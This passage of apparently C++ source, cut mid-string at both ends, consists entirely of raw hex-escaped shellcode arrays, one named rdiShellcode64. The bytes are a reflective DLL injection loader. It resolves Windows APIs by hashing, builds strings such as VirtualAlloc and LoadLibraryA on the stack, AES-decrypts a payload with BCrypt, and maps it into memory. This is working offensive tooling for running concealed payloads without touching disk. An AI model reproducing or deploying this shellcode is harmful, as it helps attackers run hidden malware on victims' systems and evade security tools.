0\x00\x66\x39\x46\x04\x0F\x85\x12\x07\x00\x00\x8B\x46\x38\x89\x44\x24\x1C\xA8\x01\x0F\x85\x03\x07\x00\x00\x0F\xB7\x4E\x14\x33\xDB\x0F\xB7\x56\x06\x83\xC1\x24\x85\xD2\x74\x2B\x03\xCE\x8B\xF0\x8B\x41\x04\x8B\x39\x85\xC0\x75\x05\x8D\x04\x3E\xEB\x02\x03\xC7\x3B\xC3\x0F\x46\xC3\x83\xC1\x28\x8B\xD8\x83\xEA\x01\x75\xE1\x8B\x74\x24\x48\x8B\x7C\x24\x30\x8D\x84\x24\xA4\x02\x00\x00\x50\xFF\x94\x24\xC4\x01\x00\x00\x8B\x8C\x24\xA8\x02\x00\x00\x8B\x46\x50\x48\x03\xC1\x8D\x51\xFF\xF7\xD2\x23\xC2\x89\x44\x24\x18\x8D\x41\xFF\x8B\x4C\x24\x18\x03\xC3\x23\xC2\x3B\xC8\x0F\x85\x8D\x06\x00\x00\x6A\x04\x68\x00\x30\x00\x00\x51\xFF\x76\x34\xFF\x94\x24\x84\x00\x00\x00\x8B\xD8\x89\x5C\x24\x5C\x85\xDB\x75\x19\x6A\x04\x68\x00\x30\x00\x00\xFF\x74\x24\x20\x50\xFF\x94\x24\x84\x00\x00\x00\x8B\xD8\x89\x44\x24\x5C\x8B\x47\x3C\x89\x43\x3C\x8B\x4F\x3C\x89\x44\x24\x48\x3B\x4E\x54\x73\x24\x8B\xC7\x8D\x14\x0B\x2B\xC3\x89\x44\x24\x1C\x8B\xD8\x8A\x04\x13\x41\x88\x02\x42\x3B\x4E\x54\x72\xF4\x8B\x5C\x24\x5C\x8B\x43\x3C\x89\x44\x24\x48\x8D\x34\x18\x33\xD2\x0F\xB7\x4E\x14\x33\xC0\x83\xC1\x28\x89\x74\x24\x38\x89\x44\x24\x20\x66\x3B\x56\x06\x73\x5D\x03\xCE\x89\x4C\x24\x2C\x33\xD2\x89\x54\x24\x18\x39\x11\x76\x33\x8B\x74\x24\x2C\x8B\x46\x04\x03\xD3\x8B\x4E\xFC\x03\xC7\x8B\x74\x24\x18\x8A\x04\x30\x88\x04\x0A\x8B\xD6\x8B\x74\x24\x2C\x42\x89\x54\x24\x18\x3B\x16\x72\xDD\x8B\x74\x24\x38\x8B\x4C\x24\x2C\x8B\x44\x24\x20\x40\x83\xC1\x28\x89\x44\x24\x20\x0F\xB7\x46\x06\x39\x44\x24\x20\x8B\x44\x24\x20\x89\x4C\x24\x2C\x72\xA9\x8B\xC3\x2B\x46\x34\x89\x44\x24\x20\x0F\x84\xC6\x00\x00\x00\x83\xBE\xA4\x00\x00\x00\x00\x0F\x84\xB9\x00\x00\x00\x8B\xBE\xA0\x00\x00\x00\x03\xFB\x83\x3F\x00\x0F\x84\xA4\x00\x00\x00\x8D\x77\x08\xE9\x80\x00\x00\x00\x0F\xB7\x0E\x66\x8B\xC1\x0F\xB7\xD1\x66\xC1\xE8\x0C\x66\x83\xF8\x0A\x75\x22\x8B\x17\x81\xE1\xFF\x0F\x00\x00\x89\x4C\x24\x1C\x8D\x04\x13\x8B\x0C\x08\x8D\x04\x13\x8B\x54\x24\x1C\x03\x4C\x24\x20\x89\x0C\x10\xEB\x46\x66\x83\xF8\x03\x75\x13\x8B\x07\x81\xE2\xFF\x0F\x00\x00\x8B\x4C\x24\x20\x03\xD3\x01\x0C\x02\xEB\x2D\x33\xC9\x41\x66\x3B\xC1\x75\x09\x8B\x44\x24\x20\xC1\xE8\x10\xEB\x0F\x6A\x02\x59\x66\x3B\xC1\x75\x14\x8B\x44\x24\x20\x0F\xB7\xC0\x8B\x0F\x81\xE2\xFF\x0F\x00\x00\x03\xD3\x01\x04\x0A\x6A\x02\x58\x03\xF0\x8B\x47\x04\x03\xC7\x3B\xF0\x0F\x85\x73\xFF\xFF\xFF\x83\x3E\x00\x8B\xFE\x0F\x85\x60\xFF\xFF\xFF\x8B\x74\x24\x38\x8B\x7C\x24\x30\x83\xBE\x84\x00\x00\x00\x00\x8B\xD7\x0F\x84\xDF\x01\x00\x00\x8B\x8E\x80\x00\x00\x00\x33\xC0\x89\x44\x24\x18\x8D\x34\x0B\x89\xB4\x24\xD0\x01\x00\x00\x83\xC6\x0C\x89\x74\x24\x1C\x39\x06\x8B\x74\x24\x38\x74\x15\x8B\x5C\x24\x1C\x8D\x5B\x14\x40\x83\x3B\x00\x75\xF7\x8B\x5C\x24\x5C\x89\x44\x24\x18\x83\xF8\x01\x0F\x86\xBF\x00\x00\x00\x83\x64\x24\x1C\x00\x8D\x70\xFF\x83\x64\x24\x2C\x00\x85\xF6\x89\x74\x24\x44\x8B\x74\x24\x38\x0F\x84\xAD\x00\x00\x00\x8B\xB4\x24\xD0\x01\x00\x00\x8B\x5C\x24\x2C\x89\x74\x24\x20\x69\xD2\xFD\x43\x03\x00\x8D\xBC\x24\x80\x02\x00\x00\x8B\xC8\xB8\xFF\x7F\x00\x00\x2B\xCB\x6A\x05\x81\xC2\xC3\x9E\x26\x00\x89\x54\x24\x30\x33\xD2\xF7\xF1\x33\xD2\x8D\x48\x01\x8B\x44\x24\x30\xC1\xE8\x10\x25\xFF\x7F\x00\x00\xF7\xF1\x8B\x54\x24\x24\x03\xC3\x6B\xC0\x14\x59\x6A\x05\x03\xC6\x43\x8B\xF0\xF3\xA5\x59\x8B\xF2\x8B\xF8\x8B\x44\x24\x18\xF3\xA5\x6A\x05\x8B\xFA\x8D\xB4\x24\x84\x02\x00\x00\x83\xC2\x14\x59\xF3\xA5\x8B\xB4\x24\xD0\x01\x00\x00\x89\x54\x24\x20\x8B\x54\x24\x2C\x3B\x5C\x24\x44\x72\x83\x8B\x74\x24\x48\x8B\x5C\x24\x5C\x03\xF3\x8B\x7C\x24\x30\x8B\x8E\x80\x00\x00\x00\xEB\x0B\x8B\x84\x24\x9C\x01\x00\x00\x89\x44\x24\x1C\x8D\x04\x19\x89\x44\x24\x20\x8B\x40\x0C\x85\xC0\x0F\x84\xC0\x00\x00\x00\x8B\x7C\x24\x28\x8B\x74\x24\x20\x03\xC3\x50\xFF\x94\x24\xAC\x01\x00\x00\x8B\xD0\x89\x54\x24\x24\x8B\x46\x10\x8B\x36\x03\xC3\x03\xF3\x89\x44\x24\x48\x8B\x0E\x85\xC9\x74\x5E\x85\xC9\x79\x0A\x50\x0F\xB7\x06\x50\x6A\x00\x52\xEB\x34\x83\xC1\x02\x33\xD2\x03\xCB\x89\x4C\x24\x44\x38\x11\x74\x0B\x42\x41\x80\x39\x00\x75\xF9\x8B\x4C\x24\x44\x50\x6A\x00\x8D\x44\x24\x18\x66\x89\x54\x24\x18\x50\xFF\x74\x24\x30\x66\x89\x54\x24\x22\x89\x4C\x24\x24\xFF\xD7\x8B\x44\x24\x48\x83\xC6\x04\x83\xC0\x04\x89\x44\x24\x48\x8B\x0E\x85\xC9\x74\x06\x8B\x54\x24\x24\xEB\xA2\x33\xC0\x40\x39\x44\x24\x18\x76\x10\x69\x44\x24\x1C\xE8\x03\x00\x00\x50\xFF\x94\x24\xC8\x01\x00\x00\x8B\x74\x24\x20\x83\xC6\x14\x89\x74\x24\x20\x8B\x46\x0C\x85\xC0\x0F\x85\x50\xFF\xFF\xFF\x8B\x74\x24\x38\x8B\x7C\x24\x30\x83\xBE\xE4\x00\x00\x00\x00\x0F\x84\xBE\x00\x00\x00\x8B\x86\xE0\x00\x00\x00\x83\xC0\x04\x03\xC3\x89\x44\x24\x18\x8B\x00\x85\xC0\x0F\x84\xA5\x00\x00\x00\x8B\x74\x24\x28\x03\xC3\x50\xFF\x94\x24\xAC\x01\x00\x00\x8B\x4C\x24\x18\x8B\xD0\x89\x54\x24\x24\x8B\x79\x08\x8B\x41\x0C\x03\xFB\x03\xC3\x89\x44\x24\x28\x83\x3F\x00\x74\x5F\x8B\x08\x85\xC9\x79\x09\x57\x0F\xB7\xC1\x50\x6A\x00\xEB\x30\x83\xC1\x02\x33\xC0\x03\xCB\x89\x4C\x24\x44\x38\x01\x74\x0B\x40\x41\x80\x39\x00\x75\xF9\x8B\x4C\x24\x44\x57\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x44\x24\x14\x6A\x00\x89\x4C\x24\x1C\x50\x52\xFF\xD6\x8B\x44\x24\x28\x83\xC7\x04\x83\xC0\x04\x89\x44\x24\x28\x83\x3F\x00\x74\x06\x8B\x54\x24\x24\xEB\xA5\x8B\x4C\x24\x18\x6A\x20\x58\x03\xC8\x89\x4C\x24\x18\x8B\x01\x85\xC0\x0F\x85\x67\xFF\xFF\xFF\x8B\x74\x24\x38\x8B\x7C\x24\x30\x0F\xB7\x46\x14\x33\xC9\x33\xD2\x89\x4C\x24\x28\x83\xC0\x28\x66\x3B\x56\x06\x0F\x83\x87\x00\x00\x00\x8D\x3C\x30\x83\x3F\x00\x74\x6B\x8B\x4F\x14\x8B\xC1\x25\x00\x00\x00\x40\xF7\xC1\x00\x00\x00\x20\x75\x12\x85\xC0\x75\x07\x6A\x08\x58\x6A\x01\xEB\x19\x6A\x04\x58\x6A\x02\xEB\x12\x85\xC0\x75\x09\xB8\x80\x00\x00\x00\x6A\x10\xEB\x05\x6A\x40\x58\x6A\x20\x85\xC9\x59\x0F\x49\xC1\x89\x44\x24\x58\xF7\x47\x14\x00\x00\x00\x04\x74\x09\x0D\x00\x02\x00\x00\x89\x44\x24\x58\x8D\x4C\x24\x58\x51\x50\x8B\x47\xFC\xFF\x37\x03\xC3\x50\xFF\x94\x24\xD8\x01\x00\x00\x8B\x4C\x24\x28\x0F\xB7\x46\x06\x41\x83\xC7\x28\x89\x4C\x24\x28\x3B\xC8\x72\x80\x8B\x7C\x24\x30\x6A\x00\x6A\x00\x6A\xFF\xFF\x94\x24\xA4\x01\x00\x00\x83\xBE\xC4\x00\x00\x00\x00\x74\x32\x8B\x86\xC0\x00\x00\x00\x8B\x44\x03\x0C\x89\x44\x24\x44\x8B\x00\x85\xC0\x74\x1E\x8B\x74\x24\x44\x33\xFF\x47\x6A\x00\x57\x53\xFF\xD0\x8D\x76\x04\x8B\x06\x85\xC0\x75\xF1\x8B\x74\x24\x38\x8B\x7C\x24\x30\x33\xC0\x40\x50\x50\x8B\x46\x28\x53\x03\xC3\xFF\xD0\x83\x7D\x0C\x00\x0F\x84\xAC\x00\x00\x00\x83\x7E\x7C\x00\x0F\x84\xA2\x00\x00\x00\x8B\x56\x78\x03\xD3\x8B\x42\x18\x85\xC0\x0F\x84\x92\x00\x00\x00\x83\x7A\x14\x00\x0F\x84\x88\x00\x00\x00\x8B\x72\x20\x8B\x4A\x24\x03\xF3\x83\x64\x24\x28\x00\x03\xCB\x89\x74\x24\x1C\x85\xC0\x74\x71\x8B\x36\x6A\x00\x58\x89\x44\x24\x18\x03\xF3\x74\x64\x8A\x06\x84\xC0\x74\x28\x8B\x5C\x24\x18\x0F\xBE\xC0\x03\xD8\xC1\xCB\x0D\x46\x8A\x06\x84\xC0\x75\xF1\x89\x5C\x24\x18\x8B\x44\x24\x18\x8B\x5C\x24\x5C\x39\x45\x0C\x75\x04\x85\xC9\x75\x1E\x8B\x44\x24\x28\x83\xC1\x02\x8B\x74\x24\x1C\x40\x83\xC6\x04\x89\x44\x24\x28\x89\x74\x24\x1C\x3B\x42\x18\x72\xA9\xEB\x18\x0F\xB7\x09\x8B\x42\x1C\xFF\x75\x14\xFF\x75\x10\x8D\x04\x88\x8B\x04\x18\x03\xC3\xFF\xD0\x59\x59\x8B\x74\x24\x3C\xEB\x09\x8B\xF0\x8B\x9C\x24\x9C\x01\x00\x00\x83\x7C\x24\x40\x00\x74\x0D\x6A\x00\xFF\x74\x24\x44\xFF\x94\x24\xAC\x01\x00\x00\x83\x7C\x24\x60\x00\x74\x0B\xFF\x74\x24\x60\xFF\x94\x24\xA0\x01\x00\x00\x85\xF6\x74\x0C\x56\x6A\x00\xFF\x54\x24\x3C\x50\xFF\x54\x24\x70\x8B\x84\x24\xA0\x01\x00\x00\x85\xC0\x74\x0C\x50\x6A\x00\xFF\x54\x24\x3C\x50\xFF\x54\x24\x70\x85\xFF\x74\x0C\x57\x6A\x00\xFF\x54\x24\x3C\x50\xFF\x54\x24\x70\x8B\xC3\xEB\x02\x33\xC0\x5F\x5E\x5B\x8B\xE5\x5D\xC3\x83\xEC\x14\x64\xA1\x30\x00\x00\x00\x53\x55\x56\x8B\x40\x0C\x57\x89\x4C\x24\x1C\x8B\x78\x0C\xE9\xA5\x00\x00\x00\x8B\x47\x30\x33\xF6\x8B\x5F\x2C\x8B\x3F\x89\x44\x24\x10\x8B\x42\x3C\x89\x7C\x24\x14\x8B\x6C\x10\x78\x89\x6C\x24\x18\x85\xED\x0F\x84\x80\x00\x00\x00\xC1\xEB\x10\x33\xC9\x85\xDB\x74\x2F\x8B\x7C\x24\x10\x0F\xBE\x2C\x0F\xC1\xCE\x0D\x80\x3C\x0F\x61\x89\x6C\x24\x10\x7C\x09\x8B\xC5\x83\xC0\xE0\x03\xF0\xEB\x04\x03\x74\x24\x10\x41\x3B\xCB\x72\xDD\x8B\x7C\x24\x14\x8B\x6C\x24\x18\x8B\x44\x2A\x20\x33\xDB\x8B\x4C\x2A\x18\x03\xC2\x89\x4C\x24\x10\x85\xC9\x74\x34\x8B\x38\x33\xED\x03\xFA\x83\xC0\x04\x89\x44\x24\x20\x8A\x0F\xC1\xCD\x0D\x0F\xBE\xC1\x03\xE8\x47\x84\xC9\x75\xF1\x8B\x7C\x24\x14\x8D\x04\x2E\x3B\x44\x24\x1C\x74\x20\x8B\x44\x24\x20\x43\x3B\x5C\x24\x10\x72\xCC\x8B\x57\x18\x85\xD2\x0F\x85\x50\xFF\xFF\xFF\x33\xC0\x5F\x5E\x5D\x5B\x83\xC4\x14\xC3\x8B\x74\x24\x18\x8B\x44\x16\x24\x8D\x04\x58\x0F\xB7\x0C\x10\x8B\x44\x16\x1C\x8D\x04\x88\x8B\x04\x10\x03\xC2\xEB\xDB\x8D\x41\x0F\x56\x8D\x72\x0F\x3B\xD0\x77\x16\x3B\xF1\x72\x12\x6A\x10\x2B\xCA\x5E\x8A\x04\x11\x88\x02\x42\x83\xEE\x01\x75\xF5\x5E\xC3\x57\x8B\xF1\x8B\xFA\xA5\xA5\xA5\xA5\x5F\x5E\xC3");
    LPSTR rdiShellcode64 = const_cast<LPSTR>("\x48\x8B\xC4\x48\x89\x58\x08\x44\x89\x48\x20\x4C\x89\x40\x18\x89\x50\x10\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8D\xA8\x28\xFD\xFF\xFF\x48\x81\xEC\xA0\x03\x00\x00\x33\xC0\xC7\x85\x58\x01\x00\x00\x6B\x00\x65\x00\x4C\x8B\xF9\x48\x89\x85\x20\x02\x00\x00\x48\x89\x85\x28\x01\x00\x00\x48\x89\x85\x10\x02\x00\x00\x8D\x78\x72\x48\x89\x85\xF0\x01\x00\x00\x8D\x50\x79\x40\x88\xBD\xA2\x00\x00\x00\x44\x8D\x50\x70\x88\x55\x18\x44\x8D\x70\x6F\x44\x88\x54\x24\x78\x8D\x48\x65\x44\x88\x75\x4A\x88\x4D\x32\x48\x89\x85\x18\x02\x00\x00\x48\x89\x85\xE8\x01\x00\x00\x48\x89\x85\x40\x02\x00\x00\x48\x89\x85\x58\x02\x00\x00\x48\x89\x85\x10\x01\x00\x00\x48\x89\x85\xF8\x01\x00\x00\x48\x89\x85\x08\x02\x00\x00\x48\x89\x85\x08\x01\x00\x00\x48\x89\x85\x00\x02\x00\x00\x48\x89\x85\xF0\x00\x00\x00\x48\x89\x45\x88\x48\x89\x85\xF8\x00\x00\x00\x89\x85\x34\x01\x00\x00\x89\x44\x24\x54\xC7\x85\x5C\x01\x00\x00\x72\x00\x6E\x00\xC7\x85\x60\x01\x00\x00\x65\x00\x6C\x00\xC7\x85\x64\x01\x00\x00\x33\x00\x32\x00\xC7\x85\x68\x01\x00\x00\x2E\x00\x64\x00\xC7\x85\x6C\x01\x00\x00\x6C\x00\x6C\x00\xC7\x85\x40\x01\x00\x00\x42\x00\x63\x00\xC7\x85\x44\x01\x00\x00\x72\x00\x79\x00\xC7\x85\x48\x01\x00\x00\x70\x00\x74\x00\xC7\x85\x4C\x01\x00\x00\x2E\x00\x64\x00\xC7\x85\x50\x01\x00\x00\x6C\x00\x6C\x00\xC7\x44\x24\x74\x53\x6C\x65\x65\xC7\x45\xA0\x4C\x6F\x61\x64\xC7\x45\xA4\x4C\x69\x62\x72\xC7\x45\xA8\x61\x72\x79\x41\xC7\x45\xB0\x56\x69\x72\x74\xC7\x45\xB4\x75\x61\x6C\x41\xC7\x45\xB8\x6C\x6C\x6F\x63\xC7\x45\xD0\x56\x69\x72\x74\xC7\x45\xD4\x75\x61\x6C\x50\xC7\x45\xD8\x72\x6F\x74\x65\x66\xC7\x45\xDC\x63\x74\xC7\x45\x50\x46\x6C\x75\x73\xC7\x45\x54\x68\x49\x6E\x73\xC7\x45\x58\x74\x72\x75\x63\xC7\x45\x5C\x74\x69\x6F\x6E\xC7\x45\x60\x43\x61\x63\x68\xC6\x45\x64\x65\xC7\x45\x38\x47\x65\x74\x4E\xC7\x45\x3C\x61\x74\x69\x76\xC7\x45\x40\x65\x53\x79\x73\xC7\x45\x44\x74\x65\x6D\x49\x66\xC7\x45\x48\x6E\x66\xC7\x45\x20\x52\x74\x6C\x41\xC7\x45\x24\x64\x64\x46\x75\xC7\x45\x28\x6E\x63\x74\x69\xC7\x45\x2C\x6F\x6E\x54\x61\x66\xC7\x45\x30\x62\x6C\xC7\x85\x88\x00\x00\x00\x42\x43\x72\x79\xC7\x85\x8C\x00\x00\x00\x70\x74\x4F\x70\xC7\x85\x90\x00\x00\x00\x65\x6E\x41\x6C\xC7\x85\x94\x00\x00\x00\x67\x6F\x72\x69\xC7\x85\x98\x00\x00\x00\x74\x68\x6D\x50\xC7\x85\x9C\x00\x00\x00\x72\x6F\x76\x69\x66\xC7\x85\xA0\x00\x00\x00\x64\x65\xC7\x45\x08\x42\x43\x72\x79\xC7\x45\x0C\x70\x74\x47\x65\xC7\x45\x10\x74\x50\x72\x6F\xC7\x45\x14\x70\x65\x72\x74\xC7\x45\xF0\x42\x43\x72\x79\xC7\x45\xF4\x70\x74\x53\x65\x33\xDB\xC7\x45\xF8\x74\x50\x72\x6F\x8D\x47\xF1\x66\x89\x9D\xC0\x01\x00\x00\x44\x8B\xD9\x88\x45\x98\x0F\x57\xC0\x66\x89\x9D\xA0\x01\x00\x00\x0F\x57\xC9\x48\x89\x9D\xE0\x00\x00\x00\xB9\x13\x9C\xBF\xBD\x89\x9D\xD8\x00\x00\x00\x0F\x11\x85\x30\x02\x00\x00\x89\x9D\x00\x01\x00\x00\x8B\xFB\x0F\x11\x8D\x60\x02\x00\x00\x89\x5C\x24\x68\x8B\xF3\x89\x5C\x24\x70\x48\x89\x9D\x48\x02\x00\x00\x48\x89\x9D\x20\x01\x00\x00\xC7\x45\xFC\x70\x65\x72\x74\x88\x55\x00\xC7\x45\x68\x42\x43\x72\x79\xC7\x45\x6C\x70\x74\x47\x65\xC7\x45\x70\x6E\x65\x72\x61\xC7\x45\x74\x74\x65\x53\x79\xC7\x45\x78\x6D\x6D\x65\x74\xC7\x45\x7C\x72\x69\x63\x4B\x66\xC7\x85\x80\x00\x00\x00\x65\x79\xC7\x45\xC0\x42\x43\x72\x79\xC7\x45\xC4\x70\x74\x44\x65\xC7\x45\xC8\x63\x72\x79\x70\xC6\x45\xCC\x74\xC7\x85\xA8\x00\x00\x00\x42\x43\x72\x79\xC7\x85\xAC\x00\x00\x00\x70\x74\x43\x6C\xC7\x85\xB0\x00\x00\x00\x6F\x73\x65\x41\xC7\x85\xB4\x00\x00\x00\x6C\x67\x6F\x72\xC7\x85\xB8\x00\x00\x00\x69\x74\x68\x6D\xC7\x85\xBC\x00\x00\x00\x50\x72\x6F\x76\xC7\x85\xC0\x00\x00\x00\x69\x64\x65\x72\xC7\x45\x90\x48\x65\x61\x70\xC7\x45\x94\x41\x6C\x6C\x6F\xC7\x45\xE0\x47\x65\x74\x50\xC7\x45\xE4\x72\x6F\x63\x65\xC7\x45\xE8\x73\x73\x48\x65\x66\xC7\x45\xEC\x61\x70\xC7\x45\x80\x48\x65\x61\x70\xC7\x45\x84\x46\x72\x65\x65\xC7\x85\xC8\x01\x00\x00\x43\x00\x68\x00\xC7\x85\xCC\x01\x00\x00\x61\x00\x69\x00\xC7\x85\xD0\x01\x00\x00\x6E\x00\x69\x00\xC7\x85\xD4\x01\x00\x00\x6E\x00\x67\x00\xC7\x85\xD8\x01\x00\x00\x4D\x00\x6F\x00\xC7\x85\xDC\x01\x00\x00\x64\x00\x65\x00\xC7\x85\xE0\x01\x00\x00\x43\x00\x42\x00\xC7\x85\xE4\x01\x00\x00\x43\x00\x00\x00\xC7\x85\xA8\x01\x00\x00\x43\x00\x68\x00\xC7\x85\xAC\x01\x00\x00\x61\x00\x69\x00\xC7\x85\xB0\x01\x00\x00\x6E\x00\x69\x00\xC7\x85\xB4\x01\x00\x00\x6E\x00\x67\x00\xC7\x85\xB8\x01\x00\x00\x4D\x00\x6F\x00\xC7\x85\xBC\x01\x00\x00\x64\x00\x65\x00\xC7\x85\x70\x01\x00\x00\x42\x00\x6C\x00\xC7\x85\x74\x01\x00\x00\x6F\x00\x63\x00\xC7\x85\x78\x01\x00\x00\x6B\x00\x4C\x00\xC7\x85\x7C\x01\x00\x00\x65\x00\x6E\x00\xC7\x85\x80\x01\x00\x00\x67\x00\x74\x00\xC7\x85\x84\x01\x00\x00\x68\x00\x00\x00\xC7\x85\x88\x01\x00\x00\x4F\x00\x62\x00\xC7\x85\x8C\x01\x00\x00\x6A\x00\x65\x00\xC7\x85\x90\x01\x00\x00\x63\x00\x74\x00\xC7\x85\x94\x01\x00\x00\x4C\x00\x65\x00\xC7\x85\x98\x01\x00\x00\x6E\x00\x67\x00\xC7\x85\x9C\x01\x00\x00\x74\x00\x68\x00\xC7\x85\x18\x01\x00\x00\x41\x00\x45\x00\xC7\x85\x1C\x01\x00\x00\x53\x00\x00\x00\xE8\x93\x0D\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x86\x0D\x00\x00\x4C\x8B\xE0\xC7\x85\x30\x01\x00\x00\x18\x00\x18\x00\x48\x8D\x85\x58\x01\x00\x00\x33\xD2\x4C\x8D\x4C\x24\x60\x48\x89\x85\x38\x01\x00\x00\x4C\x8D\x85\x30\x01\x00\x00\x33\xC9\xFF\xD3\x48\x8B\x4C\x24\x60\x48\x8D\x45\xB0\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x28\x01\x00\x00\xC7\x44\x24\x50\x0C\x00\x0C\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x4C\x24\x60\x48\x8D\x45\xD0\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x18\x02\x00\x00\xC7\x44\x24\x50\x0E\x00\x0E\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x4C\x24\x60\x48\x8D\x45\x50\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x10\x02\x00\x00\xC7\x44\x24\x50\x15\x00\x15\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x4C\x24\x60\x48\x8D\x45\x38\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\xF0\x01\x00\x00\xC7\x44\x24\x50\x13\x00\x13\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x4C\x24\x60\x48\x8D\x44\x24\x74\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\xE8\x01\x00\x00\xC7\x44\x24\x50\x05\x00\x05\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x4C\x24\x60\x48\x8D\x45\x20\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x40\x02\x00\x00\xC7\x44\x24\x50\x13\x00\x13\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x4C\x24\x60\x48\x8D\x45\xA0\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x20\x02\x00\x00\xC7\x44\x24\x50\x0C\x00\x0C\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x4C\x24\x60\x48\x8D\x45\x80\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\xF0\x00\x00\x00\xC7\x44\x24\x50\x08\x00\x08\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x4C\x24\x60\x48\x8D\x45\xE0\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x4D\x88\xC7\x44\x24\x50\x0E\x00\x0E\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x4C\x24\x60\x48\x8D\x45\x90\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\xF8\x00\x00\x00\xC7\x44\x24\x50\x09\x00\x09\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x45\x33\xF6\x4C\x39\xB5\x28\x01\x00\x00\x0F\x84\x9B\x0B\x00\x00\x4C\x39\xB5\x18\x02\x00\x00\x0F\x84\x8E\x0B\x00\x00\x4C\x39\xB5\xE8\x01\x00\x00\x0F\x84\x81\x0B\x00\x00\x4C\x39\xB5\x10\x02\x00\x00\x0F\x84\x74\x0B\x00\x00\x4C\x39\xB5\xF0\x01\x00\x00\x0F\x84\x67\x0B\x00\x00\x4C\x39\xB5\xF0\x00\x00\x00\x0F\x84\x5A\x0B\x00\x00\x4C\x39\x75\x88\x0F\x84\x50\x0B\x00\x00\x4C\x39\xB5\xF8\x00\x00\x00\x0F\x84\x43\x0B\x00\x00\x48\x8D\x85\x40\x01\x00\x00\xC7\x85\x30\x01\x00\x00\x14\x00\x14\x00\x4C\x8D\x8D\xE8\x00\x00\x00\x48\x89\x85\x38\x01\x00\x00\x4C\x8D\x85\x30\x01\x00\x00\x33\xD2\x33\xC9\xFF\xD3\x48\x8B\x8D\xE8\x00\x00\x00\x48\x8D\x85\x88\x00\x00\x00\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x58\x02\x00\x00\xC7\x44\x24\x50\x1B\x00\x1B\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x8D\xE8\x00\x00\x00\x48\x8D\x45\x08\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x10\x01\x00\x00\xC7\x44\x24\x50\x11\x00\x11\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x8D\xE8\x00\x00\x00\x48\x8D\x45\xF0\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\xF8\x01\x00\x00\xC7\x44\x24\x50\x11\x00\x11\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x8D\xE8\x00\x00\x00\x48\x8D\x45\x68\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x08\x02\x00\x00\xC7\x44\x24\x50\x1A\x00\x1A\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x8D\xE8\x00\x00\x00\x48\x8D\x45\xC0\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x08\x01\x00\x00\xC7\x44\x24\x50\x0D\x00\x0D\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\x48\x8B\x8D\xE8\x00\x00\x00\x48\x8D\x85\xA8\x00\x00\x00\x45\x33\xC0\x48\x89\x44\x24\x58\x4C\x8D\x8D\x00\x02\x00\x00\xC7\x44\x24\x50\x1C\x00\x1C\x00\x48\x8D\x54\x24\x50\x41\xFF\xD4\xB9\x53\xB0\x11\x0D\xE8\x2B\x0A\x00\x00\x4C\x8B\x95\x58\x02\x00\x00\x4C\x8B\xE8\x48\x89\x85\x50\x02\x00\x00\x4D\x85\xD2\x0F\x84\xF1\x09\x00\x00\x4C\x39\xB5\x10\x01\x00\x00\x0F\x84\xE4\x09\x00\x00\x4C\x39\xB5\xF8\x01\x00\x00\x0F\x84\xD7\x09\x00\x00\x4C\x39\xB5\x08\x02\x00\x00\x0F\x84\xCA\x09\x00\x00\x4C\x39\xB5\x08\x01\x00\x00\x0F\x84\xBD\x09\x00\x00\x4C\x39\xB5\x00\x02\x00\x00\x0F\x84\xB0\x09\x00\x00\x48\x85\xC0\x0F\x84\xA7\x09\x00\x00\x48\x8D\x95\x60\x02\x00\x00\x49\x8B\xCF\xE8\xC4\x0A\x00\x00\x49\x8D\x4F\x10\x48\x8D\x95\x30\x02\x00\x00\xE8\xB4\x0A\x00\x00\x45\x33\xC9\x48\x8D\x95\x18\x01\x00\x00\x45\x33\xC0\x48\x8D\x8D\xE0\x00\x00\x00\x41\xFF\xD2\x85\xC0\x0F\x88\xF1\x08\x00\x00\x48\x8B\x8D\xE0\x00\x00\x00\x48\x8D\x85\x00\x01\x00\x00\x44\x89\x74\x24\x28\x44\x8D\x4E\x04\x4C\x8D\x85\xD8\x00\x00\x00\x48\x89\x44\x24\x20\x48\x8D\x95\x88\x01\x00\x00\xFF\x95\x10\x01\x00\x00\x85\xC0\x0F\x88\xB9\x08\x00\x00\x8B\x9D\xD8\x00\x00\x00\xFF\x55\x88\x44\x8B\xC3\x33\xD2\x48\x8B\xC8\xFF\x95\xF8\x00\x00\x00\x48\x8B\x8D\xE0\x00\x00\x00\x44\x8D\x4E\x04\x4C\x8B\xF0\x48\x89\x85\x48\x02\x00\x00\x48\x8D\x85\x00\x01\x00\x00\x33\xDB\x89\x5C\x24\x28\x4C\x8D\x44\x24\x68\x48\x8D\x9